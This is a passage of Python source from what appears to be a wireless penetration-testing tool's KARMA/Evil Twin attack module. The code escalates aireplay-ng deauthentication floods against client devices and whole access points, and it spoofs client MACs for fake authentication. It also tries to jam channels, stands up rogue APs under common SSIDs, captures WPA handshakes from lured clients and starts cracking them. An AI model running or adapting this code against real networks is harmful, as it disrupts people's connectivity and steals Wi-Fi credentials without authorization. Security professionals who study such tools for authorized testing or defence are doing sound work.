                Color.pl('{+} {R}Escalating deauth intensity to {G}5{W} for {G}%s{W} (no connections for 120s)' % network.essid)
            elif no_connection_duration >= 180 and current_intensity < 7:  # After 3 minutes
                self.deauth_intensity[network.bssid] = 7
                Color.pl('{+} {R}Maximum deauth intensity {G}7{W} for {G}%s{W} (no connections for 180s)' % network.essid)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error escalating deauth intensity: {O}%s{W}' % str(e))
    
    def fallback_attack_mode(self):
        """Fallback attack mode when probe capture fails"""
        try:
            Color.pl('{+} {O}Activating fallback attack mode...{W}')
            Color.pl('{+} {C}This mode will use common SSIDs and aggressive deauth{W}')
            
            # Create fallback PNL with common SSIDs
            self.pnl_networks = {
                'linksys', 'netgear', 'dlink', 'belkin', 'asus', 'tp-link',
                'wifi', 'wireless', 'internet', 'home', 'office', 'guest',
                'admin', 'default', 'router', 'modem', 'attwifi', 'xfinitywifi',
                'Verizon_WiFi', 'SpectrumWiFi', 'CoxWiFi', 'CenturyLinkWiFi'
            }
            
            Color.pl('{+} {G}Fallback PNL created with {C}%d{W} common SSIDs{W}' % len(self.pnl_networks))
            
            # Use existing real_networks if available, don't scan again
            if hasattr(self, 'real_networks') and self.real_networks:
                Color.pl('{+} {G}Using existing real networks from previous scan{W}')
                Color.pl('{+} {G}Found {C}%d{W} real networks with clients{W}' % len(self.real_networks))
            else:
                # Check if we already scanned but found no networks with clients
                if hasattr(self, '_networks_scanned') and self._networks_scanned:
                    Color.pl('{+} {G}Using fallback PNL - previous scan found networks but no clients{W}')
                    Color.pl('{+} {G}Fallback mode will create Evil Twins for common SSIDs{W}')
                else:
                    # Only scan if we haven't scanned yet
                    Color.pl('{+} {C}No previous scan found - scanning for networks...{W}')
            if not self.identify_real_networks():
                Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
                return False
            
            # Mark as fallback mode
            self.fallback_mode = True
            Color.pl('{+} {G}Fallback attack mode activated successfully{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Fallback attack mode failed: {O}%s{W}' % str(e))
            return False
    
    def cleanup_and_restore_interfaces(self):
        """Clean up interfaces and restore them to working state"""
        try:
            Color.pl('{+} {C}Cleaning up interfaces and restoring network...{W}')
            
            # Stop all processes
            self.stop_all_processes()
            
            # Restore interfaces to managed mode
            interfaces_to_restore = []
            if hasattr(self, 'probe_interface') and self.probe_interface:
                interfaces_to_restore.append(self.probe_interface)
            if hasattr(self, 'rogue_interface') and self.rogue_interface:
                interfaces_to_restore.append(self.rogue_interface)
            
            for iface in interfaces_to_restore:
                try:
                    # Clean up interface name - convert monitor interfaces to base interfaces
                    base_iface = self.cleanup_interface_name(iface)
                    
                    Color.pl('{+} {C}Restoring interface {G}%s{W} to managed mode...{W}' % base_iface)
                    
                    # Bring interface down
                    subprocess.run(['ip', 'link', 'set', base_iface, 'down'], capture_output=True)
                    
                    # Set to managed mode
                    subprocess.run(['iw', 'dev', base_iface, 'set', 'type', 'managed'], capture_output=True)
                    
                    # Flush IP addresses
                    subprocess.run(['ip', 'addr', 'flush', 'dev', base_iface], capture_output=True)
                    
                    # Bring interface up
                    subprocess.run(['ip', 'link', 'set', base_iface, 'up'], capture_output=True)
                    
                    Color.pl('{+} {G}Interface {G}%s{W} restored to managed mode{W}' % base_iface)
                    
                except Exception as e:
                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (base_iface, str(e)))
            
            # Unblock rfkill
            try:
                subprocess.run(['rfkill', 'unblock', 'all'], capture_output=True)
                Color.pl('{+} {G}Unblocked all rfkill devices{W}')
            except Exception as e:
                Color.pl('{!} {R}Failed to unblock rfkill: {O}%s{W}' % str(e))
            
            # Restart network services
            try:
                subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True)
                Color.pl('{+} {G}Restarted NetworkManager{W}')
            except Exception as e:
                Color.pl('{!} {O}Warning: Failed to restart NetworkManager: {R}%s{W}' % str(e))
            
            Color.pl('{+} {G}Interface cleanup and restoration complete{W}')
            
        except Exception as e:
            Color.pl('{!} {R}Error during interface cleanup: {O}%s{W}' % str(e))
    
    def stop(self):
        """Stop the KARMA attack - interface method for GUI compatibility"""
        self.running = False
        self.stop_all_processes()
        
    def stop_all_processes(self):
        """Stop all running processes"""
        try:
            # Kill hostapd processes
            subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
            
            # Kill dnsmasq processes
            subprocess.run(['pkill', '-f', 'dnsmasq'], capture_output=True)
            
            # Kill airodump processes
            subprocess.run(['pkill', '-f', 'airodump'], capture_output=True)
            
            # Kill aireplay processes
            subprocess.run(['pkill', '-f', 'aireplay'], capture_output=True)
            
            Color.pl('{+} {G}Stopped all attack processes{W}')
            
        except Exception as e:
            Color.pl('{!} {O}Warning: Error stopping processes: {R}%s{W}' % str(e))
    
    def send_adaptive_deauth(self, network, client, intensity):
        """Send adaptive deauth packets based on intensity level"""
        try:
            # Base deauth command
            deauth_cmd = [
                'aireplay-ng',
                '-0', str(intensity),  # Number of packets based on intensity
                '--ignore-negative-one',
                '-a', network.bssid,
                '-c', client.station,  # Target client MAC address
                self.probe_interface
            ]
            
            # Execute with timeout and proper cleanup
            try:
                process = subprocess.Popen(deauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)
                
                # Shorter timeout for higher intensity
                timeout = max(1, 3 - (intensity // 2))
                process.wait(timeout=timeout)
                
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            # For high intensity, also send broadcast deauth
            if intensity >= 5:
                broadcast_cmd = [
                    'aireplay-ng',
                    '-0', '2',
                    '--ignore-negative-one',
                    '-a', network.bssid,
                    self.probe_interface
                ]
                
                try:
                    process = subprocess.Popen(broadcast_cmd, 
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL,
                                             preexec_fn=os.setsid)
                    process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except:
                        pass
                    process.kill()
            
            # For maximum intensity, try additional attack methods
            if intensity >= 7:
                self.try_fallback_attacks(network, client)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Adaptive deauth failed: {O}%s{W}' % str(e))
    
    def try_fallback_attacks(self, network, client):
        """Try additional attack methods when standard deauth fails"""
        try:
            Color.pl('{+} {R}Trying fallback attacks for {G}%s{W} from {G}%s{W}' % 
                    (client.station, network.essid))
            
            # Method 1: Fake authentication then deauth
            fakeauth_cmd = [
                'aireplay-ng',
                '-1', '0',  # Fake authentication
                '-a', network.bssid,
                '-h', client.bssid,  # Spoof client MAC
                self.probe_interface
            ]
            
            try:
                process = subprocess.Popen(fakeauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            # Method 2: Channel jamming
            self.jam_ap_channel(network)
            
            # Method 3: Multiple rapid deauth bursts
            for burst in range(3):
                rapid_deauth_cmd = [
                    'aireplay-ng',
                    '-0', '5',  # 5 packets per burst
                    '--ignore-negative-one',
                    '-a', network.bssid,
                    '-c', client.station,  # Target client MAC address
                    self.probe_interface
                ]
                
                try:
                    process = subprocess.Popen(rapid_deauth_cmd, 
                                             stdout=subprocess.DEVNULL, 
                                             stderr=subprocess.DEVNULL,
                                             preexec_fn=os.setsid)
                    process.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except:
                        pass
                    process.kill()
                
                time.sleep(0.5)  # Short delay between bursts
            
            Color.pl('{+} {C}Fallback attacks completed for {G}%s{W}' % client.station)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Fallback attacks failed: {O}%s{W}' % str(e))
    
    def send_comprehensive_deauth(self, network, client):
        """Send comprehensive deauth attack to force disconnection"""
        try:
            # Method 1: Direct client deauth (simplified to prevent overload)
            deauth_cmd = [
                'aireplay-ng',
                '-0', '2',  # Reduced to 2 deauth packets
                '--ignore-negative-one',
                '-a', network.bssid,  # Target AP
                '-c', client.station,  # Target client MAC address
                self.probe_interface
            ]
            
            # Execute with timeout and proper cleanup
            try:
                process = subprocess.Popen(deauth_cmd, 
                                         stdout=subprocess.DEVNULL, 
                                         stderr=subprocess.DEVNULL,
                                         preexec_fn=os.setsid)  # Create new process group
                
                # Wait for completion with timeout
                process.wait(timeout=3)
                
            except subprocess.TimeoutExpired:
                # Kill the process if it takes too long
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.kill()
            
            if Configuration.verbose > 1:
                Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % 
                        (client.station, network.essid))
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Comprehensive deauth failed: {O}%s{W}' % str(e))
    
    def jam_ap_channel(self, network):
        """Jam the AP's channel to make fake AP more attractive"""
        try:
            # Use airodump to create interference on the channel
            jam_cmd = [
                'airodump-ng',
                '-c', str(network.channel),
                '--bssid', network.bssid,
                self.probe_interface
            ]
            
            # Run briefly to create channel interference
            subprocess.Popen(jam_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Channel jamming failed: {O}%s{W}' % str(e))
    
    def start_handshake_capture(self):
        """Start handshake capture for WPA/WPA2 networks"""
        # Check if handshake capture is enabled
        if not getattr(Configuration, 'karma_handshake_capture', True):
            Color.pl('{+} {C}Handshake capture disabled in configuration{W}')
            return False
            
        Color.pl('\n{+} {C}Stage 5: Starting handshake capture{W}')
        
        try:
            self.handshake_capture_active = True
            
            Color.pl('{+} {C}Handshake capture active - monitoring for WPA handshakes{W}')
            
            # Start handshake capture thread
            handshake_thread = threading.Thread(target=self.monitor_handshakes)
            handshake_thread.daemon = True  # Consistent daemon setting
            handshake_thread.start()
            
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Handshake Capture', 'Monitoring for WPA handshakes')
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting handshake capture: {O}%s{W}' % str(e))
            return False
    
    def check_loop_timeout(self, loop_name, max_iterations=None, max_seconds=None):
        """Check if a loop has exceeded its timeout limits"""
        try:
            current_time = time.time()
            
            # Initialize loop start time if not exists
            if loop_name not in self._loop_start_times:
                self._loop_start_times[loop_name] = current_time
            
            # Check time-based timeout
            if max_seconds is None:
                max_seconds = self.LOOP_TIMEOUT_SECONDS
            
            elapsed_time = current_time - self._loop_start_times[loop_name]
            if elapsed_time > max_seconds:
                Color.pl('{!} {R}Loop timeout exceeded for {O}%s{W}: {C}%.1f{W} seconds' % (loop_name, elapsed_time))
                return True
            
            # Check iteration-based timeout
            if max_iterations is None:
                max_iterations = self.MAX_MONITORING_ITERATIONS
            
            # This would need to be called with iteration count from the calling loop
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking loop timeout: {O}%s{W}' % str(e))
            return True
    
    def reset_loop_timer(self, loop_name):
        """Reset the timer for a specific loop"""
        try:
            self._loop_start_times[loop_name] = time.time()
        except Exception:
            pass
    
    def register_process(self, process_name, process_obj, timeout_seconds=None):
        """Register a process for tracking and cleanup"""
        try:
            with self._process_lock:
                self._process_registry[process_name] = {
                    'process': process_obj,
                    'start_time': time.time(),
                    'timeout': timeout_seconds or self.PROCESS_CLEANUP_TIMEOUT
                }
                Color.pl('{+} {C}Registered process: {G}%s{W}' % process_name)
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error registering process: {O}%s{W}' % str(e))
    
    def unregister_process(self, process_name):
        """Unregister a process from tracking"""
        try:
            with self._process_lock:
                if process_name in self._process_registry:
                    del self._process_registry[process_name]
                    Color.pl('{+} {C}Unregistered process: {G}%s{W}' % process_name)
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error unregistering process: {O}%s{W}' % str(e))
    
    def cleanup_all_processes(self):
        """Clean up all registered processes"""
        try:
            Color.pl('{+} {C}Starting comprehensive process cleanup...{W}')
            
            with self._process_lock:
                processes_to_cleanup = list(self._process_registry.items())
                self._process_registry.clear()
            
            # Clean up processes outside of lock to avoid deadlock
            for process_name, process_info in processes_to_cleanup:
                try:
                    process_obj = process_info['process']
                    timeout = process_info['timeout']
                    
                    if hasattr(process_obj, 'poll') and process_obj.poll() is None:
                        # Process is still running
                        Color.pl('{+} {C}Terminating process: {G}%s{W}' % process_name)
                        
                        # Try graceful termination first
                        if hasattr(process_obj, 'terminate'):
                            process_obj.terminate()
                        
                        # Wait for process to terminate (reduced timeout for faster cleanup)
                        try:
                            process_obj.wait(timeout=min(timeout, 3))  # Max 3 seconds per process
                            Color.pl('{+} {G}Process terminated gracefully: {C}%s{W}' % process_name)
                        except subprocess.TimeoutExpired:
                            # Force kill if graceful termination fails
                            Color.pl('{!} {R}Process did not terminate gracefully, force killing: {O}%s{W}' % process_name)
                            if hasattr(process_obj, 'kill'):
                                process_obj.kill()
                            process_obj.wait(timeout=1)  # Reduced to 1 second
                    else:
                        Color.pl('{+} {G}Process already terminated: {C}%s{W}' % process_name)
                        
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error cleaning up process {O}%s{W}: {R}%s{W}' % (process_name, str(e)))
            
            Color.pl('{+} {G}Process cleanup completed{W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in process cleanup: {O}%s{W}' % str(e))
    
    def monitor_process_health(self):
        """Monitor health of registered processes"""
        try:
            with self._process_lock:
                current_time = time.time()
                unhealthy_processes = []
                
                for process_name, process_info in self._process_registry.items():
                    process_obj = process_info['process']
                    start_time = process_info['start_time']
                    timeout = process_info['timeout']
                    
                    # Check if process is still running
                    if hasattr(process_obj, 'poll'):
                        if process_obj.poll() is not None:
                            # Process has terminated
                            unhealthy_processes.append(process_name)
                        elif current_time - start_time > timeout * 10:  # 10x timeout threshold
                            # Process has been running too long
                            unhealthy_processes.append(process_name)
                
                # Clean up unhealthy processes
                for process_name in unhealthy_processes:
                    Color.pl('{!} {R}Unhealthy process detected: {O}%s{W}' % process_name)
                    del self._process_registry[process_name]
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring process health: {O}%s{W}' % str(e))
    
    def acquire_interface_lock(self, interface, operation_name):
        """Acquire a lock for interface operations to prevent conflicts - Enhanced implementation"""
        try:
            if interface not in self._interface_locks:
                self._interface_locks[interface] = threading.Lock()
            
            # Check if lock is already held by current thread (avoid deadlock)
            current_thread_id = threading.get_ident()
            if interface in self._interface_operations:
                existing_operation = self._interface_operations[interface]
                if existing_operation['thread_id'] == current_thread_id:
                    # Same thread already holds the lock, allow re-entry
                    Color.pl('{+} {C}Re-entering interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
                    return True
            
            # Try to acquire lock with shorter timeout for better responsiveness
            acquired = self._interface_locks[interface].acquire(timeout=2)
            if acquired:
                self._interface_operations[interface] = {
                    'operation': operation_name,
                    'start_time': time.time(),
                    'thread_id': current_thread_id
                }
                if Configuration.verbose > 1:
                    Color.pl('{+} {C}Acquired interface lock for {G}%s{W}: {C}%s{W}' % (interface, operation_name))
                return True
            else:
                # Check if existing operation is stale (older than 30 seconds)
                if interface in self._interface_operations:
                    existing_operation = self._interface_operations[interface]
                    if time.time() - existing_operation['start_time'] > 30:
                        Color.pl('{!} {R}Stale interface lock detected for {O}%s{W}, forcing release{W}' % interface)
                        self._force_release_interface_lock(interface)
                        # Try again
                        acquired = self._interface_locks[interface].acquire(timeout=2)
                        if acquired:
                            self._interface_operations[interface] = {
                                'operation': operation_name,
                                'start_time': time.time(),
                                'thread_id': current_thread_id
                            }
                            return True
                
                if Configuration.verbose > 1:
                    Color.pl('{!} {R}Failed to acquire interface lock for {O}%s{W}: {O}%s{W}' % (interface, operation_name))
                return False
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error acquiring interface lock: {O}%s{W}' % str(e))
            return False
    
    def release_interface_lock(self, interface):
        """Release interface lock and clean up operation tracking"""
        try:
            if interface in self._interface_locks:
                if interface in self._interface_operations:
                    operation_info = self._interface_operations[interface]
                    elapsed_time = time.time() - operation_info['start_time']
                    Color.pl('{+} {C}Released interface lock for {G}%s{W}: {C}%s{W} ({G}%.1f{W}s)' % 
                            (interface, operation_info['operation'], elapsed_time))
                    del self._interface_operations[interface]
                
                self._interface_locks[interface].release()
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error releasing interface lock: {O}%s{W}' % str(e))
    
    def _force_release_interface_lock(self, interface):
        """Force release a stale interface lock"""
        try:
            if interface in self._interface_locks:
                # Force release the lock
                try:
                    self._interface_locks[interface].release()
                except:
                    pass  # Lock might not be held
                
                # Clean up operation tracking
                if interface in self._interface_operations:
                    del self._interface_operations[interface]
                
                Color.pl('{!} {R}Force released stale interface lock for {O}%s{W}' % interface)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error force releasing interface lock: {O}%s{W}' % str(e))
    
    def cleanup_stale_interface_locks(self):
        """Clean up stale interface locks that have been held too long"""
        try:
            current_time = time.time()
            stale_interfaces = []
            
            for interface, operation_info in self._interface_operations.items():
                if current_time - operation_info['start_time'] > 60:  # 60 seconds timeout
                    stale_interfaces.append(interface)
            
            for interface in stale_interfaces:
                Color.pl('{!} {R}Cleaning up stale interface lock for {O}%s{W}' % interface)
                self._force_release_interface_lock(interface)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error cleaning up stale interface locks: {O}%s{W}' % str(e))
    
    def check_interface_conflicts(self):
        """Check for interface conflicts and resolve them"""
        try:
            current_time = time.time()
            conflicted_interfaces = []
            
            for interface, operation_info in self._interface_operations.items():
                elapsed_time = current_time - operation_info['start_time']
                if elapsed_time > self.INTERFACE_OPERATION_TIMEOUT:
                    conflicted_interfaces.append(interface)
                    Color.pl('{!} {R}Interface operation timeout detected: {O}%s{W} ({C}%s{W})' % 
                            (interface, operation_info['operation']))
            
            # Resolve conflicts
            for interface in conflicted_interfaces:
                Color.pl('{!} {R}Resolving interface conflict: {O}%s{W}' % interface)
                self.release_interface_lock(interface)
                self._interface_conflict_detected = True
            
            return len(conflicted_interfaces) == 0
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error checking interface conflicts: {O}%s{W}' % str(e))
            return False
    
    def safe_interface_operation(self, interface, operation_name, operation_func, *args, **kwargs):
        """Safely execute interface operations with conflict resolution"""
        try:
            # Acquire interface lock
            if not self.acquire_interface_lock(interface, operation_name):
                return False
            
            try:
                # Execute the operation
                result = operation_func(*args, **kwargs)
                return result
            finally:
                # Always release the lock
                self.release_interface_lock(interface)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in safe interface operation: {O}%s{W}' % str(e))
            # Ensure lock is released even on error
            try:
                self.release_interface_lock(interface)
            except:
                pass
            return False
    
    def monitor_handshakes(self):
        """Monitor for WPA handshakes from connected clients - Thread-safe with timeout protection"""
        try:
            Color.pl('{+} {C}Starting thread-safe handshake monitoring with timeout protection...{W}')
            
            # Initialize timeout tracking
            self.reset_loop_timer('handshake_monitoring')
            
            # Initialize thread-safe data structures
            with self._lock:
                self.active_capture_threads = {}
                self.handshake_capture_queue = []
                self._capture_attempts = {}
            
            iteration_count = 0
            max_iterations = self.MAX_MONITORING_ITERATIONS
            
            while (self.handshake_capture_active and 
                   self.running and 
                   iteration_count < max_iterations and
                   not self.check_loop_timeout('handshake_monitoring', max_iterations, 300)):
                
                try:
                    iteration_count += 1
                    
                    # Log progress every 100 iterations
                    if iteration_count % 100 == 0:
                        Color.pl('{+} {C}Handshake monitoring iteration {G}%d{W}/{C}%d{W}' % (iteration_count, max_iterations))
                    
                    # Thread-safe client processing
                    with self._client_lock:
                        clients_to_process = []
                        if self.connected_clients:
                            for client_mac in list(self.connected_clients):
                                # Check if client needs handshake capture
                                if (client_mac not in self.captured_handshakes and 
                                    client_mac not in self.active_capture_threads and
                                    client_mac not in self.handshake_capture_queue):
                                    
                                    # Check capture attempt limits
                                    attempts = self._capture_attempts.get(client_mac, 0)
                                    if attempts < self.MAX_HANDSHAKES_PER_CLIENT:
                                        clients_to_process.append(client_mac)
                    
                    # Add clients to queue thread-safely
                    with self._capture_lock:
                        for client_mac in clients_to_process:
                            if client_mac not in self.handshake_capture_queue:
                                self.handshake_capture_queue.append(client_mac)
                                self._capture_attempts[client_mac] = self._capture_attempts.get(client_mac, 0) + 1
                    
                    # Process capture queue with limits
                    with self._capture_lock:
                        active_count = len(self.active_capture_threads)
                        queue_size = len(self.handshake_capture_queue)
                        
                        # Process queue respecting limits
                        while (active_count < self.MAX_CONCURRENT_CAPTURES and 
                               queue_size > 0 and 
                               self.handshake_capture_active and 
                               self.running):
                            
                            client_mac = self.handshake_capture_queue.pop(0)
                            queue_size -= 1
                            
                            # Start capture in separate thread
                            self.start_async_handshake_capture(client_mac)
                    
                    # Clean up completed capture threads
                    self.cleanup_completed_capture_threads()
                    
                    # Adaptive sleep based on activity
                    if queue_size > 0 or active_count > 0:
                        time.sleep(0.5)  # More frequent checks when active
                    else:
                        time.sleep(2)  # Less frequent when idle
                    
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error in handshake monitoring loop: {O}%s{W}' % str(e))
                    time.sleep(2)
            
            # Check why loop ended
            if iteration_count >= max_iterations:
                Color.pl('{!} {R}Handshake monitoring stopped: maximum iterations reached ({C}%d{W})' % max_iterations)
            elif self.check_loop_timeout('handshake_monitoring'):
                Color.pl('{!} {R}Handshake monitoring stopped: timeout exceeded')
            else:
                Color.pl('{+} {G}Handshake monitoring stopped normally{W}')
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error monitoring handshakes: {O}%s{W}' % str(e))
        finally:
            # Cleanup all active capture threads
            self.cleanup_all_capture_threads()
            Color.pl('{+} {G}Handshake monitoring stopped safely{W}')
    
    def start_async_handshake_capture(self, client_mac):
        """Start asynchronous handshake capture for a client - Thread-safe implementation"""
        try:
            # Thread-safe thread creation and tracking
            with self._capture_lock:
                # Double-check if client is already being processed
                if client_mac in self.active_capture_threads:
                    return
                
                # Create capture thread
                capture_thread = threading.Thread(
                    target=self.async_capture_handshake_for_client,
                    args=(client_mac,),
                    name=f'handshake_capture_{client_mac.replace(":", "")}'
                )
                capture_thread.daemon = True
                
                # Track the thread
                self.active_capture_threads[client_mac] = {
                    'thread': capture_thread,
                    'start_time': time.time(),
                    'status': 'starting'
                }
                
                capture_thread.start()
                Color.pl('{+} {C}Started thread-safe handshake capture for {G}%s{W}' % client_mac)
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting async handshake capture: {O}%s{W}' % str(e))
            # Remove from active threads if failed to start
            with self._capture_lock:
                if client_mac in self.active_capture_threads:
                    del self.active_capture_threads[client_mac]
    
    def async_capture_handshake_for_client(self, client_mac):
        """Asynchronous handshake capture for a specific client - Fixed implementation matching WPA behavior"""
        try:
            # Update thread status
            if client_mac in self.active_capture_threads:
                self.active_capture_threads[client_mac]['status'] = 'capturing'
            
            Color.pl('{+} {C}Starting handshake capture for {G}%s{W}...' % client_mac)
            
            # Get the AP BSSID for this client (CRITICAL FIX)
            ap_bssid = self.get_ap_bssid_for_client(client_mac)
            if not ap_bssid:
                Color.pl('{!} {R}No AP found for client {O}%s{W}' % client_mac)
                return
            
            # Get the channel from target or real_networks
            ap_channel = None
            if hasattr(self, 'target') and self.target and hasattr(self.target, 'channel'):
                ap_channel = self.target.channel
            elif self.real_networks:
                for network in self.real_networks:
                    if hasattr(network, 'bssid') and network.bssid == ap_bssid:
                        if hasattr(network, 'channel'):
                            ap_channel = network.channel
                            break
            
            Color.pl('{+} {C}Targeting AP {G}%s{W} on channel {G}%s{W} for client {G}%s{W}' % (ap_bssid, ap_channel or 'auto', client_mac))
            
            # Use safe interface operation for airodump
            # FIXED: Capture on rogue interface to capture handshakes from clients connected to our fake AP
            def capture_operation():
                with Airodump(interface=self.rogue_interface,  # Capture on rogue interface where clients connect
                             target_bssid=None,  # Capture all traffic to get handshakes from our rogue AP
                             channel=ap_channel,
                             output_file_prefix='karma_handshake_%s' % client_mac.replace(':', ''),
                             delete_existing_files=True) as airodump:
                    
                    # Monitor for handshake with extended timeout matching WPA approach
                    timeout = getattr(Configuration, 'wpa_attack_timeout', 60)
                    if timeout <= 0:
                        timeout = 120
                    timer = Timer(timeout)
                    handshake_found = False
                    last_handshake_check = 0
                    last_deauth_check = 0
                    
                    # Deauth timer similar to WPA
                    deauth_timeout = getattr(Configuration, 'wpa_deauth_timeout', 5)
                    if deauth_timeout <= 0:
                        deauth_timeout = 5
                    deauth_timer = Timer(deauth_timeout)
                    
                    Color.pl('{+} {C}Starting handshake capture for {G}%s{W} (timeout: %ds){W}' % (client_mac, timeout))
                    
                    while not timer.ended() and not handshake_found and self.running:
                        current_time = time.time()
                        
                        # Check for handshake every 2 seconds (matching WPA behavior)
                        if current_time - last_handshake_check >= 2:
                            last_handshake_check = current_time
                            
                            cap_files = airodump.find_files(endswith='.cap')
                            if cap_files:
                                cap_file = cap_files[0]
                                # Use Handshake class for validation (same as WPA)
                                try:
                                    from ..model.handshake import Handshake
                                    
                                    # Get rogue AP BSSID for handshake validation
                                    rogue_ap_bssid = None
                                    # Try to get it from interface  
                                    if self.rogue_interface:
                                        try:
                                            import subprocess
                                            rogue_iface = self.rogue_interface
                                            result = subprocess.run(['ip', 'link', 'show', rogue_iface],
                                                                    capture_output=True, text=True, timeout=2)
                                            if 'ether' in result.stdout:
                                                for line in result.stdout.split('\n'):
                                                    if 'ether' in line:
                                                        parts = line.split()
                                                        for i, part in enumerate(parts):
                                                            if part == 'ether' and i + 1 < len(parts):
                                                                rogue_ap_bssid = parts[i + 1].lower()
                                                                break
                                        except:
                                            pass
                                    
                                    # Use rogue AP BSSID or fallback to original AP BSSID
                                    handshake_bssid = rogue_ap_bssid or ap_bssid
                                    
                                    if Configuration.verbose > 1:
                                        Color.pl('{+} {C}Checking for handshake with BSSID: {G}%s{W}' % handshake_bssid)
                                    
                                    handshake = Handshake(capfile=cap_file, bssid=handshake_bssid)
                                    if handshake.has_handshake():
                                        self.captured_handshakes[client_mac] = cap_file
                                        Color.pl('{+} {G}WPA handshake captured from {C}%s{W}!' % client_mac)
                                        handshake_found = True
                                        
                                        # Save handshake to permanent directory using rogue AP BSSID
                                        self.save_karma_handshake(cap_file, client_mac, handshake_bssid)
                                        
                                        # Attempt to crack the handshake asynchronously
                                        self.crack_handshake_async(client_mac, cap_file)
                                except Exception as e:
                                    if Configuration.verbose > 1:
                                        Color.pl('{!} {R}Error checking handshake: {O}%s{W}' % str(e))
                        
                        # Send deauth periodically (matching WPA timing)
                        if current_time - last_deauth_check >= deauth_timeout:
                            last_deauth_check = current_time
                            try:
                                # Use Aireplay.deauth like WPA does
                                Color.pl('{+} {C}Sending deauth to trigger handshake for {G}%s{W}...' % client_mac)
                                Aireplay.deauth(target_bssid=ap_bssid, client_mac=client_mac, timeout=2)
                            except Exception as e:
                                if Configuration.verbose > 1:
                                    Color.pl('{!} {R}Error sending deauth: {O}%s{W}' % str(e))
                        
                        time.sleep(1)  # Check interval (matching WPA)
                    
                    if not handshake_found:
                        Color.pl('{!} {R}No handshake captured from {O}%s{W} after %d seconds' % (client_mac, timeout))
                    
                    return handshake_found
            
            # Execute capture operation safely
            handshake_found = self.safe_interface_operation(
                self.probe_interface, 
                'handshake_capture',
                capture_operation
            )
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in async handshake capture: {O}%s{W}' % str(e))
        finally:
            # Update thread status to completed
            if client_mac in self.active_capture_threads:
                self.active_capture_threads[client_mac]['status'] = 'completed'
    
    def capture_handshake_for_client(self, client_mac):
        """Legacy method - redirects to async implementation"""
        self.start_async_handshake_capture(client_mac)
    
    def _get_rogue_ap_bssid(self):
        """Get the BSSID of our rogue AP - Enhanced implementation"""
        try:
            # Method 1: Get the MAC address of our rogue interface
            cmd = ['ip', 'link', 'show', self.rogue_interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                # Extract MAC address from ip link output
                for line in result.stdout.split('\n'):
                    if 'link/ether' in line:
                        mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                        if mac_match:
                            return mac_match.group(1).lower()
            
            # Method 2: Try to get from hostapd config if available
            if hasattr(self, 'hostapd_config') and self.hostapd_config:
                try:
                    with open(self.hostapd_config, 'r') as f:
                        content = f.read()
                        bssid_match = re.search(r'bssid=([a-fA-F0-9:]{17})', content)
                        if bssid_match:
                            return bssid_match.group(1).lower()
                except Exception:
                    pass
            
            # Method 3: Try to get from iw command
            try:
                cmd = ['iw', 'dev', self.rogue_interface, 'info']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'addr' in line:
